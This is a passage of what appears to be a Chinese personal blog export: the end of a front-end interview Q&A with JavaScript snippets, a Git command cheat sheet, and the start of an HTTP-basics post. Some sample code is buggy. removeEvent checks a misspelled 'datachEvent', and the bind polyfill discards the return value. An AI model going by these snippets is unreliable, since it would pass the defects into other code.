<li>基本思想是使用对象，类，继承，封装等基本概念来进行程序设计</li>
<li>优点
<ul>
<li>易维护
<ul>
<li>采用面向对象思想设计的结构，可读性高，由于继承的存在，即使改变需求，那么维护也只是在局部模块，所以维护起来是非常方便和较低成本的</li>
</ul>
</li>
<li>易扩展</li>
<li>开发工作的重用性、继承性高，降低重复工作量。</li>
<li>缩短了开发周期</li>
</ul>
</li>
</ul>
<h3 id="49-对web标准-可用性-可访问性的理解"><a class="markdownIt-Anchor" href="#49-对web标准-可用性-可访问性的理解"></a> 49、对web标准、可用性、可访问性的理解</h3>
<ul>
<li>可用性（Usability）：产品是否容易上手，用户能否完成任务，效率如何，以及这过程中用户的主观感受可好，是从用户的角度来看产品的质量。可用性好意味着产品质量高，是企业的核心竞争力</li>
<li>可访问性（Accessibility）：Web内容对于残障用户的可阅读和可理解性</li>
<li>可维护性（Maintainability）：一般包含两个层次，一是当系统出现问题时，快速定位并解决问题的成本，成本低则可维护性好。二是代码是否容易被人理解，是否容易修改和增强功能。</li>
</ul>
<h2 id="编程题-2"><a class="markdownIt-Anchor" href="#编程题-2"></a> $编程题</h2>
<h3 id="1-写一个通用的事件侦听器函数"><a class="markdownIt-Anchor" href="#1-写一个通用的事件侦听器函数"></a> 1、写一个通用的事件侦听器函数</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// event(事件)工具集，来源：github.com/markyun</span></span><br><span class="line">   markyun.Event = &#123;</span><br><span class="line">      </span><br><span class="line">       <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></span><br><span class="line">       <span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></span><br><span class="line">       addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">               <span class="comment">//事件类型、需要执行的函数、是否捕捉</span></span><br><span class="line">               element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">               element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                   handler.call(element);</span><br><span class="line">               &#125;);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               element[<span class="string">'on'</span> + type] = handler;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="comment">// 移除事件</span></span><br><span class="line">       removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">               element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</span><br><span class="line">               element.detachEvent(<span class="string">'on'</span> + type, handler);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></span><br><span class="line">       stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (ev.stopPropagation) &#123;</span><br><span class="line">               ev.stopPropagation();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               ev.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="comment">// 取消事件的默认行为</span></span><br><span class="line">       preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">               event.preventDefault();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               event.returnValue = <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">       <span class="comment">// 获取事件目标</span></span><br><span class="line">       getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-如何判断一个对象是否为数组"><a class="markdownIt-Anchor" href="#2-如何判断一个对象是否为数组"></a> 2、如何判断一个对象是否为数组</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isArray</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> arg === <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(arg) === <span class="string">'[object Array]'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-冒泡排序"><a class="markdownIt-Anchor" href="#3-冒泡排序"></a> 3、冒泡排序</h3>
<ul>
<li>每次比较相邻的两个数，如果后一个比前一个小，换位置</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[j + <span class="number">1</span>] &lt; arr[j]) &#123;</span><br><span class="line">            <span class="keyword">var</span> temp;</span><br><span class="line">            temp = arr[j];</span><br><span class="line">            arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">            arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bubbleSort(arr));</span><br></pre></td></tr></table></figure>
<h3 id="4-快速排序"><a class="markdownIt-Anchor" href="#4-快速排序"></a> 4、快速排序</h3>
<ul>
<li>采用二分法，取出中间数，数组每次和中间数比较，小的放到左边，大的放到右边</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];    <span class="comment">// 返回空数组</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> cIndex = <span class="built_in">Math</span>.floor(arr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">var</span> c = arr.splice(cIndex, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> l = [];</span><br><span class="line">    <span class="keyword">var</span> r = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] &lt; c) &#123;</span><br><span class="line">            l.push(arr[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> quickSort(l).concat(c, quickSort(r));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(quickSort(arr));</span><br></pre></td></tr></table></figure>
<h3 id="5-编写一个方法-求一个字符串的字节长度"><a class="markdownIt-Anchor" href="#5-编写一个方法-求一个字符串的字节长度"></a> 5、编写一个方法 求一个字符串的字节长度</h3>
<ul>
<li>假设：一个英文字符占用一个字节，一个中文字符占用两个字节</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetBytes</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> len = str.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bytes = len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (str.charCodeAt(i) &gt; <span class="number">255</span>) bytes++;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">alert(GetBytes(<span class="string">"你好,as"</span>));</span><br></pre></td></tr></table></figure>
<h3 id="6-bind的用法以及如何实现bind的函数和需要注意的点"><a class="markdownIt-Anchor" href="#6-bind的用法以及如何实现bind的函数和需要注意的点"></a> 6、bind的用法，以及如何实现bind的函数和需要注意的点</h3>
<ul>
<li><code>bind</code>的作用与<code>call</code>和<code>apply</code>相同，区别是<code>call</code>和<code>apply</code>是立即调用函数，而<code>bind</code>是返回了一个函数，需要调用的时候再执行。<br />
一个简单的<code>bind</code>函数实现如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fn = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fn.apply(ctx, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2"></a> $其他</h2>
<h3 id="1-谈谈你对重构的理解"><a class="markdownIt-Anchor" href="#1-谈谈你对重构的理解"></a> 1、谈谈你对重构的理解</h3>
<ul>
<li>
<p>网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化， 在扩展的同时保持一致的UI</p>
</li>
<li>
<p>对于传统的网站来说重构通常是：</p>
<ul>
<li>
<p>表格(<code>table</code>)布局改为<code>DIV+CSS</code></p>
</li>
<li>
<p>使网站前端兼容于现代浏览器(针对于不合规范的<code>CSS</code>、如对IE6有效的)</p>
</li>
<li>
<p>对于移动平台的优化</p>
</li>
<li>
<p>针对于<code>SEO</code>进行优化</p>
</li>
</ul>
</li>
</ul>
<h3 id="2-什么样的前端代码是好的"><a class="markdownIt-Anchor" href="#2-什么样的前端代码是好的"></a> 2、什么样的前端代码是好的</h3>
<ul>
<li>高复用低耦合，这样文件小，好维护，而且好扩展。</li>
</ul>
<h3 id="3-对前端工程师这个职位是怎么样理解的它的前景会怎么样"><a class="markdownIt-Anchor" href="#3-对前端工程师这个职位是怎么样理解的它的前景会怎么样"></a> 3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？</h3>
<ul>
<li>
<p>前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近</p>
<ul>
<li>实现界面交互</li>
<li>提升用户体验</li>
<li>有了Node.js，前端可以实现服务端的一些事情</li>
</ul>
</li>
<li>
<p>前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好，</p>
</li>
<li>
<p>与团队成员，<code>UI</code>设计，产品经理的沟通；</p>
</li>
<li>
<p>做好的页面结构，页面重构和用户体验；</p>
</li>
</ul>
<h3 id="4-你觉得前端工程的价值体现在哪"><a class="markdownIt-Anchor" href="#4-你觉得前端工程的价值体现在哪"></a> 4、你觉得前端工程的价值体现在哪</h3>
<ul>
<li>
<p>为简化用户使用提供技术支持（交互部分）</p>
</li>
<li>
<p>为多个浏览器兼容性提供支持</p>
</li>
<li>
<p>为提高用户浏览速度（浏览器性能）提供支持</p>
</li>
<li>
<p>为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持</p>
</li>
<li>
<p>为展示数据提供支持（数据接口）</p>
</li>
</ul>
<h3 id="5-平时如何管理你的项目"><a class="markdownIt-Anchor" href="#5-平时如何管理你的项目"></a> 5、平时如何管理你的项目？</h3>
<ul>
<li>
<p>先期团队必须确定好全局样式（<code>globe.css</code>），编码模式(<code>utf-8</code>) 等；</p>
</li>
<li>
<p>编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）；</p>
</li>
<li>
<p>标注样式编写人，各模块都及时标注（标注关键样式调用的地方）；</p>
</li>
<li>
<p>页面进行标注（例如 页面 模块 开始和结束）；</p>
</li>
<li>
<p><code>CSS</code>跟<code>HTML</code> 分文件夹并行存放，命名都得统一（例如<code>style.css</code>）；</p>
</li>
<li>
<p><code>JS</code> 分文件夹存放 命名以该<code>JS</code>功能为准的英文翻译。</p>
</li>
<li>
<p>图片采用整合的 <code>images.png png8</code> 格式文件使用 - 尽量整合在一起使用方便将来的管理</p>
</li>
</ul>
<h2 id="人事面-2"><a class="markdownIt-Anchor" href="#人事面-2"></a> 人事面</h2>
<ul>
<li>面试完你还有什么问题要问的吗</li>
<li>你有什么爱好?</li>
<li>你最大的优点和缺点是什么?</li>
<li>你为什么会选择这个行业，职位?</li>
<li>你觉得你适合从事这个岗位吗?</li>
<li>你有什么职业规划?</li>
<li>你对工资有什么要求?</li>
<li>如何看待前端开发？</li>
<li>未来三到五年的规划是怎样的？</li>
</ul>
<h2 id="常问-2"><a class="markdownIt-Anchor" href="#常问-2"></a> 常问</h2>
<ul>
<li>自我介绍</li>
<li>你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？</li>
<li>你认为哪个项目做得最好？</li>
<li>最近在看哪些前端方面的书？</li>
<li>平时是如何学习前端开发的？</li>
<li>你最有成就感的一件事</li>
<li>你是怎么学习前端的</li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Git笔记总结篇</title>
    <url>/hexolog/post/6c7ee97f.html</url>
    <content><![CDATA[<blockquote>
<p>声明：资料来源互联网</p>
</blockquote>
<h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h3>
<hr />
<ul>
<li>
<p>在 Windows 上安装 Git 同样轻松，有个叫做 <a href="http://msysgit.github.io/" target="_blank" rel="noopener">msysGit</a> 的项目提供了安装包。</p>
</li>
<li>
<p>完成安装之后，就可以使用命令行的 git 工具（已经自带了 ssh 客户端）了，另外还有一个图形界面的 Git 项目管理工具。</p>
</li>
</ul>
<h3 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h3>
<hr />
<ul>
<li>首先是配置帐号信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -e [--global]            <span class="comment"># 编辑Git配置文件</span></span><br><span class="line">git config --global user.name yanhaijing</span><br><span class="line">git config --global user.email yanhaijing@yeah.net</span><br><span class="line">git config --list                   <span class="comment">#查看配置的信息</span></span><br><span class="line">git <span class="built_in">help</span> config                     <span class="comment">#获取帮助信息</span></span><br></pre></td></tr></table></figure>
<ul>
<li>配置自动换行（自动转换坑太大）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.autocrlf input   <span class="comment">#提交到git是自动将换行符转换为lf</span></span><br></pre></td></tr></table></figure>
<ul>
<li>配置密钥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C yanhaijing@yeah.net      <span class="comment">#生成密钥</span></span><br><span class="line">ssh -T git@github.com                     <span class="comment">#测试是否成功</span></span><br></pre></td></tr></table></figure>
<ul>
<li>配置别名，git的命令没有自动完成功能，有点坑哈，别名派上了用场</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global alias.st status       <span class="comment">#git st</span></span><br><span class="line">git config --global alias.co checkout     <span class="comment">#git co</span></span><br><span class="line">git config --global alias.br branch       <span class="comment">#git br</span></span><br><span class="line">git config --global alias.ci commit       <span class="comment">#git ci</span></span><br></pre></td></tr></table></figure>
<h3 id="新建仓库"><a class="markdownIt-Anchor" href="#新建仓库"></a> 新建仓库</h3>
<hr />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init                                   <span class="comment">#初始化</span></span><br><span class="line">git status                                 <span class="comment">#获取状态</span></span><br><span class="line">git add [file1] [file2] ...                <span class="comment">#.或*代表全部添加</span></span><br><span class="line">git commit -m <span class="string">"message"</span>                    <span class="comment">#此处注意乱码</span></span><br><span class="line">git remote add origin git@github.com:yanhaijing/test.git     <span class="comment">#添加源</span></span><br><span class="line">git push -u origin master                  <span class="comment">#push同事设置默认跟踪分支</span></span><br></pre></td></tr></table></figure>
<h3 id="从现有仓库克隆"><a class="markdownIt-Anchor" href="#从现有仓库克隆"></a> 从现有仓库克隆</h3>
<hr />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/yanhaijing/data.js.git    </span><br><span class="line">git <span class="built_in">clone</span> git://github.com/schacon/grit.git mypro   <span class="comment">#克隆到自定义文件夹</span></span><br></pre></td></tr></table></figure>
<h3 id="本地"><a class="markdownIt-Anchor" href="#本地"></a> 本地</h3>
<hr />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add *                 <span class="comment"># 跟踪新文件</span></span><br><span class="line">git add -u [path]         <span class="comment"># 添加[指定路径下]已跟踪文件</span></span><br><span class="line"></span><br><span class="line">rm *&amp;git rm *             <span class="comment"># 移除文件</span></span><br><span class="line">git rm -f *               <span class="comment"># 移除文件</span></span><br><span class="line">git rm --cached *         <span class="comment"># 停止追踪指定文件，但该文件会保留在工作区</span></span><br><span class="line">git mv file_from file_to    <span class="comment"># 重命名跟踪文件</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">log</span>                     <span class="comment"># 查看提交记录</span></span><br><span class="line"></span><br><span class="line">git commit <span class="comment"># 提交更新    </span></span><br><span class="line">git commit [file1] [file2] ...   <span class="comment"># 提交指定文件    </span></span><br><span class="line">git commit -m <span class="string">'message'</span></span><br><span class="line">git commit -a       <span class="comment"># 跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交</span></span><br><span class="line">git commit --amend         <span class="comment">#修改最后一次提交</span></span><br><span class="line">git commit -v              <span class="comment"># 提交时显示所有diff信息</span></span><br><span class="line"></span><br><span class="line">git reset HEAD *           <span class="comment">#取消已经暂存的文件</span></span><br><span class="line">git reset --mixed HEAD *     <span class="comment">#同上</span></span><br><span class="line">git reset --soft HEAD *      <span class="comment">#重置到指定状态，不会修改索引区和工作树</span></span><br><span class="line">git reset --hard HEAD *      <span class="comment">#重置到指定状态，会修改索引区和工作树</span></span><br><span class="line">git reset -- files           <span class="comment">#重置index区文件</span></span><br><span class="line"></span><br><span class="line">git revert HEAD          <span class="comment">#撤销前一次操作</span></span><br><span class="line">git revert HEAD~          <span class="comment">#撤销前前一次操作</span></span><br><span class="line">git revert commit          <span class="comment">#撤销指定操作</span></span><br><span class="line"></span><br><span class="line">git checkout -- file     <span class="comment">#取消对文件的修改（从暂存区——覆盖worktree file）</span></span><br><span class="line">git checkout branch|tag|commit -- file_name   <span class="comment">#从仓库取出file覆盖当前分支</span></span><br><span class="line">git checkout -- .         <span class="comment">#从暂存区取出文件覆盖工作区</span></span><br><span class="line"></span><br><span class="line">git diff file               <span class="comment">#查看指定文件的差异</span></span><br><span class="line">git diff --<span class="built_in">stat</span>               <span class="comment">#查看简单的diff结果</span></span><br><span class="line">git diff               <span class="comment">#比较Worktree和Index之间的差异</span></span><br><span class="line">git diff --cached               <span class="comment">#比较Index和HEAD之间的差异</span></span><br><span class="line">git diff HEAD               <span class="comment">#比较Worktree和HEAD之间的差异</span></span><br><span class="line">git diff branch               <span class="comment">#比较Worktree和branch之间的差异</span></span><br><span class="line">git diff branch1 branch2               <span class="comment">#比较两次分支之间的差异</span></span><br><span class="line">git diff commit commit               <span class="comment">#比较两次提交之间的差异</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">log</span>                    <span class="comment">#查看最近的提交日志</span></span><br><span class="line">git <span class="built_in">log</span> --pretty=oneline     <span class="comment">#单行显示提交日志</span></span><br><span class="line">git <span class="built_in">log</span> --graph              <span class="comment"># 图形化显示</span></span><br><span class="line">git <span class="built_in">log</span> --abbrev-commit      <span class="comment"># 显示log id的缩写</span></span><br><span class="line">git <span class="built_in">log</span> -num                <span class="comment">#显示第几条log（倒数）</span></span><br><span class="line">git <span class="built_in">log</span> --<span class="built_in">stat</span>          <span class="comment"># 显示commit历史，以及每次commit发生变更的文件</span></span><br><span class="line">git <span class="built_in">log</span> --follow [file]        <span class="comment"># 显示某个文件的版本历史，包括文件改名</span></span><br><span class="line">git <span class="built_in">log</span> -p [file]               <span class="comment"># 显示指定文件相关的每一次diff</span></span><br><span class="line"></span><br><span class="line">git stash       <span class="comment">#将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。</span></span><br><span class="line">git stash list       <span class="comment">#查看保存的工作现场</span></span><br><span class="line">git stash apply       <span class="comment">#恢复工作现场</span></span><br><span class="line">git stash drop       <span class="comment">#删除stash内容</span></span><br><span class="line">git stash pop       <span class="comment">#恢复的同时直接删除stash内容</span></span><br><span class="line">git stash apply stash@&#123;0&#125;       <span class="comment">#恢复指定的工作现场，当你保存了不只一份工作现场时。</span></span><br></pre></td></tr></table></figure>
<h3 id="分支"><a class="markdownIt-Anchor" href="#分支"></a> 分支</h3>
<hr />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch        <span class="comment">#列出本地分支</span></span><br><span class="line">git branch -r      <span class="comment">#列出远端分支</span></span><br><span class="line">git branch -a      <span class="comment">#列出所有分支</span></span><br><span class="line">git branch -v      <span class="comment">#查看各个分支最后一个提交对象的信息</span></span><br><span class="line">git branch --merge     <span class="comment">#查看已经合并到当前分支的分支</span></span><br><span class="line">git branch --no-merge     <span class="comment">#查看为合并到当前分支的分支</span></span><br><span class="line">git branch <span class="built_in">test</span>          <span class="comment">#新建test分支</span></span><br><span class="line">git branch branch [branch|commit|tag]      <span class="comment"># 从指定位置出新建分支</span></span><br><span class="line">git branch --track branch remote-branch    <span class="comment"># 新建一个分支，与指定的远程分支建立追踪关系</span></span><br><span class="line">git branch -m old new           <span class="comment">#重命名分支</span></span><br><span class="line">git branch -d <span class="built_in">test</span>              <span class="comment">#删除test分支</span></span><br><span class="line">git branch -D <span class="built_in">test</span>              <span class="comment">#强制删除test分支</span></span><br><span class="line">git branch --<span class="built_in">set</span>-upstream dev origin/dev   <span class="comment">#将本地dev分支与远程dev分支之间建立链接</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="built_in">test</span>               <span class="comment">#切换到test分支</span></span><br><span class="line">git checkout -b <span class="built_in">test</span>           <span class="comment">#新建+切换到test分支</span></span><br><span class="line">git checkout -b <span class="built_in">test</span> dev         <span class="comment">#基于dev新建test分支，并切换</span></span><br><span class="line"></span><br><span class="line">git merge <span class="built_in">test</span>              <span class="comment">#将test分支合并到当前分支</span></span><br><span class="line">git merge --squash <span class="built_in">test</span>     <span class="comment">#合并压缩，将test上的commit压缩为一条</span></span><br><span class="line"></span><br><span class="line">git cherry-pick commit      <span class="comment">#拣选合并，将commit合并到当前分支</span></span><br><span class="line">git cherry-pick -n commit   <span class="comment">#拣选多个提交，合并完后可以继续拣选下一个提交</span></span><br><span class="line"></span><br><span class="line">git rebase master           <span class="comment">#将master分之上超前的提交，变基到当前分支</span></span><br><span class="line">git rebase --onto master 169a6  <span class="comment">#限制回滚范围，rebase当前分支从169a6以后的提交</span></span><br><span class="line">git rebase --interactive     <span class="comment">#交互模式    </span></span><br><span class="line">git rebase --<span class="built_in">continue</span>        <span class="comment">#处理完冲突继续合并    </span></span><br><span class="line">git rebase --skip           <span class="comment">#跳过    </span></span><br><span class="line">git rebase --abort          <span class="comment">#取消合并</span></span><br></pre></td></tr></table></figure>
<h3 id="远端"><a class="markdownIt-Anchor" href="#远端"></a> 远端</h3>
<hr />
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch origin remotebranch[:localbranch]   <span class="comment"># 从远端拉去分支[到本地指定分支]</span></span><br><span class="line"></span><br><span class="line">git merge origin/branch                     <span class="comment">#合并远端上指定分支</span></span><br><span class="line"></span><br><span class="line">git pull origin remotebranch:localbranch   <span class="comment">#拉去远端分支到本地分支</span></span><br><span class="line"></span><br><span class="line">git push origin branch                      <span class="comment">#将当前分支，推送到远端上指定分支</span></span><br><span class="line">git push origin localbranch:remotebranch    <span class="comment">#推送本地指定分支，到远端上指定分支</span></span><br><span class="line">git push origin :remotebranch               <span class="comment">#删除远端指定分支</span></span><br><span class="line">git push origin remotebranch --delete       <span class="comment">#删除远程分支</span></span><br><span class="line">git branch -dr branch                      <span class="comment">#删除本地和远程分支</span></span><br><span class="line">git checkout -b [--track] <span class="built_in">test</span> origin/dev  <span class="comment">#基于远端dev分支，新建本地test分支[同时设置跟踪]</span></span><br></pre></td></tr></table></figure>
<h3 id="源"><a class="markdownIt-Anchor" href="#源"></a> 源</h3>
<hr />
<blockquote>
<p>git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。</p>
</blockquote>
<ul>
<li>个人开发时，多源用的可能不多，但多源其实非常有用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin1 git@github.com:yanhaijing/data.js.git</span><br><span class="line"></span><br><span class="line">git remote                  <span class="comment">#显示全部源</span></span><br><span class="line">git remote -v                <span class="comment">#显示全部源+详细信息</span></span><br><span class="line"></span><br><span class="line">git remote rename origin1 origin2      <span class="comment">#重命名</span></span><br><span class="line"></span><br><span class="line">git remote rm origin                  <span class="comment">#删除</span></span><br><span class="line"></span><br><span class="line">git remote show origin               <span class="comment">#查看指定源的全部信息</span></span><br></pre></td></tr></table></figure>
<h3 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签</h3>
<hr />
<blockquote>
<p>当开发到一定阶段时，给程序打标签是非常棒的功能。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag                           <span class="comment">#列出现有标签    </span></span><br><span class="line"></span><br><span class="line">git tag v0.1 [branch|commit]         <span class="comment"># [从指定位置]新建标签</span></span><br><span class="line">git tag -a v0.1 -m <span class="string">'my version 1.4'</span>   <span class="comment">#新建带注释标签</span></span><br><span class="line"></span><br><span class="line">git checkout tagname                <span class="comment">#切换到标签</span></span><br><span class="line"></span><br><span class="line">git push origin v1.5               <span class="comment">#推送分支到源上</span></span><br><span class="line">git push origin --tags            <span class="comment">#一次性推送所有分支</span></span><br><span class="line"></span><br><span class="line">git tag -d v0.1                      <span class="comment">#删除标签</span></span><br><span class="line">git push origin :refs/tags/v0.1      <span class="comment">#删除远程标签</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Http协议相关</title>
    <url>/hexolog/post/e8d53a5a.html</url>
    <content><![CDATA[<h1 id="一-基础概念"><a class="markdownIt-Anchor" href="#一-基础概念"></a> 一 、基础概念</h1>
<h2 id="web-基础"><a class="markdownIt-Anchor" href="#web-基础"></a> Web 基础</h2>
<ul>
<li>HTTP（HyperText Transfer Protocol，超文本传输协议）。</li>
<li>WWW（World Wide Web）的三种技术：HTML、HTTP、URL。</li>
<li>RFC（Request for Comments，征求修正意见书），互联网的设计文档。</li>
</ul>
<h2 id="url"><a class="markdownIt-Anchor" href="#url"></a> URL</h2>
<ul>
<li>URI（Uniform Resource Indentifier，统一资源标识符）</li>
<li>URL（Uniform Resource Locator，统一资源定位符）</li>
<li>URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4 。</li>
</ul>
<p>URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/23451405.jpg" width="400"/> </div><br>
<h2 id="请求和响应报文"><a class="markdownIt-Anchor" href="#请求和响应报文"></a> 请求和响应报文</h2>
<h3 id="1-请求报文"><a class="markdownIt-Anchor" href="#1-请求报文"></a> 1. 请求报文</h3>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/86602526.jpg" width=""/> </div><br>
<h3 id="2-响应报文"><a class="markdownIt-Anchor" href="#2-响应报文"></a> 2. 响应报文</h3>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/40769835.jpg" width=""/> </div><br>
